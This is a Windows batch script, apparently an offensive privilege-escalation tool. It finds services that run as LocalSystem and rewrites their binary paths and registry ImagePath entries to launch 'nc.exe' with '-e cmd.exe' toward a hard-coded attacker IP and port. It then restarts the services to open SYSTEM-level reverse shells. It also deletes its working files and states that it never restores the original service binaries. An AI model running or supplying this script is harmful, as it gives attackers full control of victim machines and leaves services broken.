@echo off
setlocal enabledelayedexpansion

REM upload this file and nc.exe to desired location (c:\windows\system32\spool\drivers\color)
REM change ip and port
REM shell might be unstable so run nc.exe again
REM restore binary path not yet implemented!

set IP="10.10.15.20"
set PORT=9876

echo SEARCHING FOR VULNERABLE SERVICES

for /f "tokens=5 delims=\" %%i in ('reg query hklm\system\currentcontrolset\services') do sc qc %%i >> a
powershell sls LocalSystem a -context 9,0 > b
powershell sls AUTO_START,DEMAND_START b -context 2,0 > c

for /f "tokens=3 delims= " %%x in (c) do echo %%x >> d
powershell $i = 0
powershell "gc d | ? {$i %% 3 -eq 0; $i++}" > e

for /f %%j in (e) do sc stop %%j >nul 2>&1
for /f %%k in (e) do sc config %%k binpath= "c:\windows\system32\spool\drivers\color\nc.exe %IP% %PORT% -e cmd.exe" >nul 2>&1
for /f %%m in (e) do reg add hklm\system\currentcontrolset\services\%%m /t reg_expand_sz /v imagepath /d "c:\windows\system32\spool\drivers\color\nc.exe %IP% %PORT% -e cmd.exe" /f >nul 2>&1
for /f %%n in (e) do echo ATTEMPTING TO EXPLOIT: %%n && sc start %%n >nul 2>&1

del a b c d e

echo DONE
